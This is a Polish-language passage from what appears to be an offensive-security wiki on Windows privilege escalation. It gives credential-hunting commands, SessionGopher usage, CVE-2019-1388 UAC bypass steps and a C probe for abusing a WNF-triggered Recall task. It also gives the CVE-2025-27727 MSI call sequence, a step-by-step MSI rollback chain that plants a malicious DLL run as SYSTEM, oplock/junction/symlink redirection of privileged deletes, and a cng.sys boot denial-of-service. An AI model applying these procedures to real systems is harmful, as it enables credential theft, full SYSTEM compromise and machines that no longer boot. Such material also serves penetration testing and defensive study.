**Component Object Model (COM)** to technologia wbudowana w system operacyjny Windows, która umożliwia **komunikację** między komponentami oprogramowania napisanymi w różnych językach. Każdy komponent COM jest **identyfikowany za pomocą identyfikatora klasy (CLSID)**, a każdy komponent udostępnia funkcje za pośrednictwem co najmniej jednego interfejsu, identyfikowanego za pomocą identyfikatora interfejsu (IID).

Klasy i interfejsy COM są zdefiniowane w rejestrze odpowiednio pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**. Ten rejestr powstaje przez połączenie **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Wśród identyfikatorów CLSID w tym rejestrze można znaleźć podrzędny klucz rejestru **InProcServer32**, który zawiera **wartość domyślną** wskazującą na **DLL** oraz wartość o nazwie **ThreadingModel**, która może przyjmować wartość **Apartment** (jednowątkowy), **Free** (wielowątkowy), **Both** (jedno- lub wielowątkowy) albo **Neutral** (niezależny od wątku).

![Browsers History - COM DLL Overwriting: Inside the CLSIDs of this registry you can find the child registry InProcServer32 which contains a default value pointing to a DLL and a value...](<../../images/image (729).png>)

Zasadniczo, jeśli możesz **nadpisać dowolny z plików DLL**, które zostaną uruchomione, możesz **eskalować uprawnienia**, jeśli tę bibliotekę DLL uruchomi inny użytkownik.

Aby dowiedzieć się, jak atakujący wykorzystują COM Hijacking jako mechanizm utrwalania dostępu, zobacz:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Wyszukiwanie haseł w plikach i rejestrze**

**Wyszukiwanie treści plików**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Wyszukaj plik o określonej nazwie**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Przeszukaj rejestr w poszukiwaniu nazw kluczy i haseł**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Narzędzia do wyszukiwania haseł

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **to plugin msf. Stworzyłem go, aby **automatycznie uruchamiać każdy moduł POST Metasploit, który wyszukuje dane uwierzytelniające** na komputerze ofiary.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie wyszukuje wszystkie pliki zawierające hasła wymienione na tej stronie.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) to kolejne świetne narzędzie do wyodrębniania haseł z systemu.

Narzędzie [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sesje**, **nazwy użytkowników** i **hasła** używane przez różne narzędzia, które zapisują te dane w postaci zwykłego tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Wyobraź sobie, że **proces działający jako SYSTEM otwiera nowy proces** (`OpenProcess()`) z **pełnym dostępem**. Ten sam proces **tworzy również nowy proces** (`CreateProcess()`) **z niskimi uprawnieniami, który dziedziczy wszystkie otwarte uchwyty głównego procesu**.\
Jeśli masz **pełny dostęp do procesu o niskich uprawnieniach**, możesz przejąć **otwarty uchwyt do procesu z podwyższonymi uprawnieniami utworzonego przez** `OpenProcess()` i **wstrzyknąć shellcode**.\
[Przeczytaj ten przykład, aby dowiedzieć się więcej o tym, **jak wykryć i wykorzystać tę lukę**.](leaked-handle-exploitation.md)\
[Przeczytaj też [**ten wpis**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/), który dokładniej wyjaśnia, jak testować i nadużywać większej liczby otwartych uchwytów procesów i wątków dziedziczonych z różnymi poziomami uprawnień (nie tylko pełnym dostępem).]

## Named Pipe Client Impersonation

Segmenty pamięci współdzielonej, nazywane **potokami** (pipes), umożliwiają komunikację między procesami i przesyłanie danych.

Windows udostępnia funkcję o nazwie **Named Pipes**, która pozwala niepowiązanym procesom współdzielić dane, także przez różne sieci. Przypomina to architekturę klient/serwer, w której role określa się jako **serwer named pipe** i **klient named pipe**.

Gdy **klient** wysyła dane przez potok, **serwer**, który go skonfigurował, może **przejąć tożsamość** **klienta**, o ile ma wymagane uprawnienia **SeImpersonate**. Znalezienie **procesu z podwyższonymi uprawnieniami**, który komunikuje się przez potok, którego możesz imitować, daje możliwość **uzyskania wyższych uprawnień** przez przyjęcie tożsamości tego procesu, gdy wejdzie w interakcję z utworzonym przez ciebie potokiem. Instrukcje przeprowadzenia takiego ataku znajdziesz [**tutaj**](named-pipe-client-impersonation.md) oraz [**tutaj**](#from-high-integrity-to-system).

Poniższe narzędzie pozwala również **przechwytywać komunikację przez named pipe za pomocą narzędzia takiego jak Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **To narzędzie pozwala wyświetlić listę wszystkich potoków i je przeglądać, aby znaleźć privesc:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Zdalny zapis DWORD w Telephony tapsrv prowadzący do RCE

Usługa Telephony (TapiSrv) w trybie serwera udostępnia `\\pipe\\tapsrv` (MS-TRP). Uwierzytelniony zdalny klient może nadużyć asynchronicznej ścieżki zdarzeń opartej na mailslotach, aby zmienić `ClientAttach` w dowolny **zapis 4 bajtów** do istniejącego pliku, do którego zapis ma `NETWORK SERVICE`, a następnie uzyskać prawa administratora Telephony i załadować dowolną bibliotekę DLL jako usługa. Pełny przebieg:

- `ClientAttach` z `pszDomainUser` ustawionym na istniejącą ścieżkę, do której można zapisywać → usługa otwiera ją przez `CreateFileW(..., OPEN_EXISTING)` i używa do asynchronicznego zapisu zdarzeń.
- Każde zdarzenie zapisuje kontrolowany przez atakującego `InitContext` z `Initialize` do tego uchwytu. Zarejestruj aplikację linii za pomocą `LRegisterRequestRecipient` (`Req_Func 61`), wywołaj `TRequestMakeCall` (`Req_Func 121`), pobierz dane przez `GetAsyncEvents` (`Req_Func 0`), a następnie wyrejestruj ją lub zamknij, aby powtarzać deterministyczne zapisy.
- Dodaj siebie do `[TapiAdministrators]` w `C:\Windows\TAPI\tsec.ini`, połącz się ponownie, a następnie wywołaj `GetUIDllName` z dowolną ścieżką do DLL, aby uruchomić `TSPI_providerUIIdentify` jako `NETWORK SERVICE`.

Więcej informacji:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Różne

### Rozszerzenia plików, które mogą uruchamiać kod w Windows

Odwiedź stronę **[https://filesec.io/](https://filesec.io/)**

### Nadużycie protocol handler / ShellExecute za pośrednictwem rendererów Markdown

Klikalne linki Markdown przekazywane do `ShellExecuteExW` mogą uruchamiać niebezpieczne URI handlers (`file:`, `ms-appinstaller:` lub dowolny zarejestrowany schemat) i wykonywać pliki kontrolowane przez atakującego jako bieżący użytkownik. Zobacz:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitorowanie wierszy poleceń w poszukiwaniu haseł**

Po uzyskaniu shell jako użytkownik może się okazać, że uruchamiane są zaplanowane zadania lub inne procesy, które **przekazują poświadczenia w wierszu poleceń**. Poniższy skrypt co dwie sekundy przechwytuje wiersze poleceń procesów, porównuje bieżący stan z poprzednim i wyświetla wszelkie różnice.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Kradzież haseł z procesów

## Od użytkownika o niskich uprawnieniach do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Jeśli masz dostęp do interfejsu graficznego (przez konsolę lub RDP), a UAC jest włączone, w niektórych wersjach systemu Microsoft Windows można uruchomić terminal lub dowolny inny proces jako „NT\AUTHORITY SYSTEM”, korzystając z konta nieuprzywilejowanego użytkownika.

Umożliwia to jednoczesne eskalowanie uprawnień i ominięcie UAC przy użyciu tej samej luki. Nie trzeba też niczego instalować, a plik binarny używany podczas tego procesu jest podpisany i wydany przez Microsoft.

Do systemów, których dotyczy problem, należą między innymi:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Aby wykorzystać tę podatność, należy wykonać następujące kroki:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Masz wszystkie niezbędne pliki i informacje w repozytorium GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od poziomu Medium administratora do wysokiego poziomu integralności / UAC Bypass

Przeczytaj to, aby **dowiedzieć się o poziomach integralności**:


{{#ref}}
integrity-levels.md
{{#endref}}

Następnie **przeczytaj to, aby dowiedzieć się o UAC i obejściach UAC:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kierowanie junctionów katalogów uploadu do katalogu głównego obsługiwanego przez serwer

Aplikacja może utworzyć przewidywalny podkatalog uploadu, zapisać w nim plik o nazwie podanej przez wywołującego, a następnie przetworzyć ten plik. Jeśli użytkownik o niskich uprawnieniach może usunąć i zastąpić ten podkatalog junctionem NTFS przed zapisem po stronie serwera, zapis może zostać przekierowany przez junction do katalogu obsługiwanego przez serwer WWW. Umieszczony tam skrypt może zostać uruchomiony z uprawnieniami tożsamości usługi WWW, jeśli serwer wykonuje pliki tego typu. Jest to zależna od konkretnej aplikacji granica dowolnego zapisu; sam katalog uploadu z prawami zapisu ani istniejący junction nie stanowią na to dowodu.

Sprawdź dokładny sposób konstruowania ścieżki i moment zapisu w handlerze uploadu, efektywne uprawnienia użytkownika do usuwania i tworzenia podkatalogu, efektywne ACL miejsca docelowego, to, czy mechanizm zapisujący podąża za punktami ponownej analizy, oraz to, czy serwer WWW wykonuje pliki w miejscu docelowym. Osobno potwierdź tożsamości procesów mechanizmu zapisującego i serwera WWW. Pasywna inwentaryzacja może wykazać ACL katalogów i metadane punktów ponownej analizy, ale nie pozwala ustalić zachowania handlera ani przyszłej podmiany junctionu. Jeśli plik zostanie uruchomiony w kontekście konta usługi, przed rozważeniem osobnej ścieżki wykorzystującej uprawnienia tokenu sprawdź **rzeczywisty token procesu**.

## Czyszczenie uprzywilejowanego zaplanowanego zadania wyzwalane przez WNF

Zaplanowane zadanie, które odmawia ręcznego uruchomienia, może mimo to udostępniać wyzwalacz dostępny dla użytkownika bez uprawnień. Podczas audytu uprzywilejowanego zadania wyeksportuj jego XML i sprawdź **wszystkie** wyzwalacze, a także DACL zadania, podmiot i akcję. W szczególności element `WnfStateChangeTrigger` wskazuje stan Windows Notification Facility (WNF); jeśli ten stan z zabezpieczeniami zezwala bieżącemu użytkownikowi na opublikowanie aktualizacji, użytkownik może pośrednio uruchomić zadanie z skonfigurowaną dla niego tożsamością, mimo ustawienia `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Na przykład zadanie Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` działało jako SYSTEM, przyjmowało od zwykłego użytkownika aktualizacje stanu WNF `7508BCA32C079E41`, a następnie sprawdzało `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, nawet gdy Recall było wyłączone.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Aby przetestować osiągalność, rozwiąż `ZwUpdateWnfStateData` z `ntdll.dll`, prześlij pustą aktualizację dla ośmiobajtowej nazwy stanu i porównaj zwrócony status z danymi o ostatnim uruchomieniu zadania lub aktywnością w Procmon. Poniższa uproszczona sonda używa sekwencji bajtów z przykładu zadania Recall; zastąp ją bajtami wyeksportowanymi dla testowanego zadania.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Przekształcanie rekurencyjnego czyszczenia w uprzywilejowane usuwanie

Przydatnym prymitywem nie jest sam trigger, lecz uprzywilejowana procedura czyszczenia, która przyjmuje katalog kontrolowany przez atakującego. Prześledź operację od enumeracji do końcowej modyfikacji: wykrywanie profili/sesji, wybieranie elementów podrzędnych za pomocą wildcardów, `SHCreateItemFromParsingName` i `IFileOperation::DeleteItem` to mocne oznaki, że wcześniej sprawdzona ścieżka zostanie później przeszukana rekurencyjnie. Jeśli elementy podrzędne nie są otwierane względem zaufanych uchwytów katalogów i weryfikowane przed usunięciem, atakujący może zmienić sposób rozwiązywania ścieżki między enumeracją a użyciem.<sup>[[43]](#references)</sup>

Połącz trigger WNF z opisanym poniżej [podstawieniem oplock, junction i dowiązania symbolicznego Object Manager](#from-folder-contents-delete-to-system-eop): oplock wstrzymuje proces czyszczenia po wybraniu przez niego prawidłowego elementu podrzędnego, a następnie zapisywalny katalog nadrzędny zostaje podmieniony, tak że po wznowieniu uprzywilejowane usuwanie prowadzi przez `\RPC Control` do chronionego celu. W łańcuchu Recall pozwoliło to usunąć jako SYSTEM katalog `C:\Config.Msi`, co było wymagane przez opisaną technikę MSI rollback.<sup>[[31]](#references)[[43]](#references)</sup>

### Zagnieżdżone elementy podrzędne omijają powierzchowne poprawki dotyczące reparse point

Sama weryfikacja katalogu kontrolowanego przez atakującego i jego bezpośredniego elementu podrzędnego nie zabezpiecza rekurencyjnego usuwania opartego na ścieżce. Pozostaw te sprawdzone obiekty bez zmian, a podstawienie junction/oplock przenieś do kolejnego elementu podrzędnego; `IFileOperation::DeleteItem` w końcu dotrze do nieweryfikowanego elementu i podąży za jego nowym celem. CVE-2026-20941 powstało właśnie w wyniku tego rodzaju niekompletnej poprawki: pierwsza poprawka Recall weryfikowała `UKP` i katalog o nazwie w formacie GUID, ale pozostawiała dotychczasową rekurencyjną operację usuwania.<sup>[[43]](#references)</sup>

Bezpieczny wzorzec polega na otwieraniu **każdego elementu podrzędnego** względem już zaufanego uchwytu katalogu, pobraniu i zweryfikowaniu końcowej rozpoznanej ścieżki/obiektu oraz zastosowaniu dyspozycji usunięcia do zweryfikowanego uchwytu. Nie weryfikuj prefiksu, a następnie nie wracaj do rekurencyjnego usuwania opartego na ścieżce. Podczas przeglądu poprawek sprawdź też struktury w miejscu faktycznego wywołania: w tym przypadku analiza działania programu wykazała, że `OBJECT_ATTRIBUTES` w `NtCreateFile` zawierał niepusty `RootDirectory` i względną nazwę `{GUID}\\secure_file.lock`, co obaliło mylący wynik dekompilatora sugerujący istnienie drugiego prymitywu `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Od dowolnego usuwania/przenoszenia/zmiany nazwy folderu do SYSTEM EoP

Technika opisana [**w tym wpisie na blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), wraz z kodem exploita [**dostępnym tutaj**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Atak polega zasadniczo na wykorzystaniu funkcji rollback Windows Installer do zastąpienia prawidłowych plików złośliwymi podczas procesu odinstalowywania. W tym celu atakujący musi utworzyć **złośliwy instalator MSI**, który posłuży do przejęcia katalogu `C:\Config.Msi`. Windows Installer wykorzysta go później do przechowywania plików rollback podczas odinstalowywania innych pakietów MSI; pliki rollback zostaną wcześniej zmodyfikowane tak, aby zawierały złośliwy payload.

### Wstrzyknięcie ścieżki czyszczenia COM w Windows Installer (CVE-2025-27727)

Klient z niskimi uprawnieniami może uzyskać dostęp do usługi SYSTEM `msiexec.exe` za pośrednictwem obiektu COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Analiza wsteczna wskazała odpowiednie wywołania `IMsiServer`: `MsiBeginTransactionW` przy przesunięciu vtable `0xA0`, `SetEEUIDirectoryAndFilter` przy `0xC8` oraz `CleanupTempPackages` przy `0x50`. Te nazwy i przesunięcia ustalono w drodze analizy wstecznej i mogą się różnić między kompilacjami.<sup>[[41]](#references)</sup>

W przypadku użytkownika niebędącego administratorem `SetEEUIDirectoryAndFilter` podszywa się pod wywołującego tylko podczas otwierania podanej ścieżki z uprawnieniem `DELETE` oraz flagami `FILE_FLAG_BACKUP_SEMANTICS` i `FILE_FLAG_OPEN_REPARSE_POINT`. Dowodzi to, że wywołujący może usunąć katalog, i zapobiega podążaniu za reparse point, ale **nie** wiąże sprawdzonego obiektu pliku z późniejszym czyszczeniem ani nie dowodzi, że utworzył go Windows Installer.<sup>[[41]](#references)</sup>

Po `MsiBeginTransactionW` funkcja `SetEEUIDirectoryAndFilter` planuje czyszczenie ścieżki jako folderu, niezależnie od argumentu filtra przekazanego przez wywołującego. Usługa zapisuje nazwaną wartość `REG_DWORD` w `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: nazwą wartości jest ścieżka kontrolowana przez wywołującego, a dane `0x00000002` oznaczają folder. Następnie `CleanupTempPackages(NULL, FALSE)` bezpośrednio rozpoczyna czyszczenie. Podwyższony worker enumeruje wartości rejestru i przekazuje wpisy folderów do rekurencyjnego `FDeleteFolder` bez sprawdzania pochodzenia ścieżki. Jeśli zwykłe usuwanie się nie powiedzie, kod wywołuje również `LockdownPath`, usuwa atrybuty pliku i ponawia próbę.<sup>[[41]](#references)</sup>

Minimalna sekwencja wywołań odtworzona z `msi.dll`:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Przydatnym prymitywem jest ponowne użycie ścieżki, a nie przekierowanie przez junction. Zarejestruj utworzone przez atakującego `C:\Config.Msi`, usuń je i pozwól, by Windows Installer później odtworzył tę samą ścieżkę z chronionymi danymi rollback. Podczas czyszczenia system ufa nieaktualnej nazwie `TempPackages` i usuwa nowy katalog jako SYSTEM. Pozwala to ominąć zamierzoną ochronę zapewnianą przez `FILE_FLAG_OPEN_REPARSE_POINT` i mechanizm ograniczający zaufanie do przekierowań, ponieważ nie jest wymagany żaden reparse point.<sup>[[41]](#references)</sup>

Ten prymityw usuwania pasuje do poniższego łańcucha rollback: zachowaj osobny wpis `Installer\Folders`, usuń chroniony `C:\Config.Msi`, odtwórz go z NULL DACL i zachowaj uchwyt z uprawnieniem `WRITE_DAC`, uzyskanym przed zaostrzeniem DACL przez installer. Wcześniej otwarty uchwyt może przywrócić liberalną DACL za pomocą `NtSetSecurityObject`, po czym wygenerowany plik `.rbs` można podmienić, zanim rollback zostanie wznowiony.<sup>[[41]](#references)</sup>

Microsoft naprawił tę ścieżkę, uniemożliwiając `CMsiTransaction::SetEEUIDirectoryAndFilter` wywołanie `ScheduleFileOrFolderDelete`, gdy włączona jest nowa funkcja. Wywołanie COM nadal może zwrócić sukces, ale ścieżka kontrolowana przez atakującego nie zostanie już dodana do `TempPackages`. Zastosuj aktualizacje zabezpieczeń Windows z kwietnia 2025 r. i nie traktuj pomyślnego zwrotu metody jako testu poprawności poprawki.<sup>[[41]](#references)[[42]](#references)</sup>

Podsumowanie techniki:

1. **Etap 1 – Przygotowanie do przejęcia (pozostawienie pustego `C:\Config.Msi`)**

- Krok 1: Zainstaluj MSI
    - Utwórz plik `.msi`, który instaluje nieszkodliwy plik (np. `dummy.txt`) w zapisywalnym folderze (`TARGETDIR`).
    - Oznacz installer jako **"UAC Compliant"**, aby **użytkownik bez uprawnień administratora** mógł go uruchomić.
    - Po instalacji pozostaw otwarty **uchwyt** do pliku.

- Krok 2: Rozpocznij odinstalowywanie
    - Odinstaluj ten sam plik `.msi`.
    - Proces odinstalowywania zaczyna przenosić pliki do `C:\Config.Msi` i zmieniać ich nazwy na pliki `.rbf` (kopie zapasowe rollback).
    - **Odpytuj otwarty uchwyt pliku** za pomocą `GetFinalPathNameByHandle`, aby wykryć, kiedy plik stanie się `C:\Config.Msi\<random>.rbf`.

- Krok 3: Niestandardowa synchronizacja
    - Plik `.msi` zawiera **niestandardową akcję odinstalowywania (`SyncOnRbfWritten`)**, która:
        - Sygnalizuje zapisanie pliku `.rbf`.
        - Następnie **czeka** na inne zdarzenie przed kontynuowaniem odinstalowywania.

- Krok 4: Zablokuj usunięcie pliku `.rbf`
    - Po otrzymaniu sygnału **otwórz plik `.rbf`** bez `FILE_SHARE_DELETE` — dzięki temu **nie można go usunąć**.
    - Następnie **odeślij sygnał**, aby odinstalowywanie mogło się zakończyć.
    - Windows Installer nie może usunąć pliku `.rbf`, a ponieważ nie może usunąć całej zawartości, **katalog `C:\Config.Msi` nie zostaje usunięty**.

- Krok 5: Ręcznie usuń plik `.rbf`
    - Ręcznie usuń plik `.rbf`.
    - Teraz **`C:\Config.Msi` jest pusty** i można go przejąć.

> W tym momencie **wyzwól podatność umożliwiającą usuwanie dowolnych folderów na poziomie SYSTEM**, aby usunąć `C:\Config.Msi`.

2. **Etap 2 – Podmiana skryptów rollback na złośliwe**

- Krok 6: Odtwórz `C:\Config.Msi` ze słabymi ACL
    - Samodzielnie odtwórz folder `C:\Config.Msi`.
    - Ustaw **słabe DACL** (np. Everyone:F) i **pozostaw otwarty uchwyt** z uprawnieniem `WRITE_DAC`.

- Krok 7: Uruchom kolejną instalację
    - Ponownie zainstaluj plik `.msi`, ustawiając:
        - `TARGETDIR`: zapisywalna lokalizacja.
        - `ERROROUT`: zmienna, która wywoła wymuszone niepowodzenie.
    - Ta instalacja posłuży do ponownego wywołania **rollback**, który odczytuje pliki `.rbs` i `.rbf`.

- Krok 8: Monitoruj pojawienie się pliku `.rbs`
    - Użyj `ReadDirectoryChangesW`, aby monitorować `C:\Config.Msi`, aż pojawi się nowy plik `.rbs`.
    - Zapisz jego nazwę.

- Krok 9: Synchronizuj przed rollback
    - Plik `.msi` zawiera **niestandardową akcję instalacji (`SyncBeforeRollback`)**, która:
        - Sygnalizuje zdarzenie po utworzeniu pliku `.rbs`.
        - Następnie **czeka** przed kontynuowaniem.

- Krok 10: Ponownie zastosuj słabe ACL
    - Po odebraniu zdarzenia `rbs created`:
        - Windows Installer **ponownie ustawia silne ACL** dla `C:\Config.Msi`.
        - Ale ponieważ nadal masz uchwyt z uprawnieniem `WRITE_DAC`, możesz **ponownie ustawić słabe ACL**.

> ACL są **egzekwowane tylko podczas otwierania uchwytu**, więc nadal możesz zapisywać w folderze.

- Krok 11: Umieść fałszywe pliki `.rbs` i `.rbf`
    - Zastąp plik `.rbs` **fałszywym skryptem rollback**, który poleca Windows:
        - Przywrócić plik `.rbf` (złośliwy DLL) w uprzywilejowanej lokalizacji (np. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Umieść fałszywy plik `.rbf` zawierający **złośliwy payload DLL działający na poziomie SYSTEM**.

- Krok 12: Wywołaj rollback
    - Zasygnalizuj zdarzenie synchronizacji, aby installer wznowił działanie.
    - Skonfigurowano **niestandardową akcję typu 19 (`ErrorOut`)**, która **celowo powoduje niepowodzenie instalacji** w określonym momencie.
    - Powoduje to rozpoczęcie **rollback**.

- Krok 13: SYSTEM instaluje DLL
    - Windows Installer:
        - Odczytuje złośliwy plik `.rbs`.
        - Kopiuje DLL z pliku `.rbf` do lokalizacji docelowej.
    - Teraz masz **złośliwy DLL w ścieżce, z której ładuje go SYSTEM**.

- Ostatni krok: Wykonaj kod jako SYSTEM
    - Uruchom zaufany **automatycznie podwyższający uprawnienia plik binarny** (np. `osk.exe`), który ładuje przejęty przez Ciebie DLL.
    - **Gotowe**: Twój kod zostaje wykonany **jako SYSTEM**.


### Od dowolnego usuwania/przenoszenia/zmiany nazwy pliku do SYSTEM EoP

Główna technika rollback MSI (opisana wcześniej) zakłada, że możesz usunąć **cały folder** (np. `C:\Config.Msi`). Ale co, jeśli podatność pozwala tylko na **usuwanie dowolnych plików**?

Możesz wykorzystać **mechanizmy wewnętrzne NTFS**: każdy folder ma ukryty alternatywny strumień danych o nazwie:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ten strumień przechowuje **metadane indeksu** folderu.

Dlatego jeśli **usuniesz strumień `::$INDEX_ALLOCATION`** folderu, NTFS **usuwa cały folder** z systemu plików.

Możesz to zrobić za pomocą standardowych API do usuwania plików, takich jak:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Mimo że wywołujesz API usuwania *pliku*, **usuwa ono sam folder**.

### Od usuwania zawartości folderu do SYSTEM EoP
Co jeśli Twoja primitive nie pozwala usuwać dowolnych plików/folderów, ale **pozwala usuwać *zawartość* folderu kontrolowanego przez atakującego**?

1. Krok 1: Przygotuj folder-przynętę i plik
- Utwórz: `C:\temp\folder1`
- Wewnątrz utwórz: `C:\temp\folder1\file1.txt`

2. Krok 2: Ustaw **oplock** na `file1.txt`
- **Oplock** **wstrzymuje wykonanie**, gdy uprzywilejowany proces próbuje usunąć `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Krok 3: Uruchom proces SYSTEM (np. `SilentCleanup`)
- Ten proces skanuje foldery (np. `%TEMP%`) i próbuje usunąć ich zawartość.
- Gdy dotrze do `file1.txt`, **oplock zostaje aktywowany** i przekazuje kontrolę do Twojego callbacka.

4. Krok 4: W callbacku oplocka — przekieruj usuwanie

- Opcja A: Przenieś `file1.txt` w inne miejsce
    - Spowoduje to opróżnienie `folder1` bez przerwania oplocka.
    - Nie usuwaj bezpośrednio `file1.txt` — oplock zostałby przedwcześnie zwolniony.

- Opcja B: Zmień `folder1` w **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcja C: Utwórz **symlink** w `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Ten atak jest wymierzony w wewnętrzny strumień NTFS przechowujący metadane folderu — jego usunięcie usuwa folder.

5. Krok 5: Zwolnij oplock
- Proces SYSTEM kontynuuje działanie i próbuje usunąć `file1.txt`.
- Jednak teraz, ze względu na junction + symlink, tak naprawdę usuwa:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Wynik**: `C:\Config.Msi` zostaje usunięty przez SYSTEM.

### Od utworzenia dowolnego katalogu do trwałego DoS

Wykorzystaj prymityw umożliwiający **utworzenie dowolnego katalogu jako SYSTEM/admin** — nawet jeśli **nie możesz zapisywać plików** ani **ustawiać słabych uprawnień**.

Utwórz **katalog** (nie plik) o nazwie **krytycznego sterownika Windows**, np.:
```
C:\Windows\System32\cng.sys
```

- Ta ścieżka zwykle odpowiada sterownikowi trybu jądra `cng.sys`.
- Jeśli **utworzysz wcześniej w jej miejscu folder**, system Windows nie załaduje właściwego sterownika podczas uruchamiania.
- Następnie system Windows próbuje załadować `cng.sys` podczas uruchamiania.
- Widzi folder, **nie może odnaleźć właściwego sterownika** i **ulega awarii lub zatrzymuje uruchamianie**.
- **Nie ma mechanizmu awaryjnego ani możliwości odzyskania systemu** bez zewnętrznej interwencji (np. naprawy rozruchu lub dostępu do dysku).

### Od uprzywilejowanych ścieżek logów/kopii zapasowych + dowiązań symbolicznych OM do nadpisania dowolnego pliku / DoS podczas uruchamiania

Gdy **uprzywilejowana usługa** zapisuje logi/eksporty w ścieżce odczytanej z **konfiguracji, którą można zapisywać**, przekieruj tę ścieżkę za pomocą **dowiązań symbolicznych Object Manager + punktów montowania NTFS**, aby zamienić uprzywilejowany zapis w nadpisanie dowolnego pliku (nawet **bez** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Wymagania**
